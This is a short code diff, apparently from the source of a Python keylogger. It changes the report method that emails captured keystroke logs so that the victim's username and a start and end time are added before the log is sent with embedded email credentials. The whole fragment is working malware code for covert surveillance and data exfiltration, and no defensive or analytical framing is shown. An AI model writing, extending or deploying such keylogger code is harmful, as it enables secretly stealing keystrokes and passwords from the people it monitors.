@@ -43,7 +43,8 @@ class Keylogger:
 
     def report(self):
         if self.log:
-            self.log += str(getuser()) + "\n"
+            self.end_dt = datetime.now()
+            self.log += str(getuser()) + f"\n{self.start_dt} - {self.end_dt}\n" 
             self.sendmail(SEND_EMAIL, EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
             self.start_dt = datetime.now()
         self.log = ""
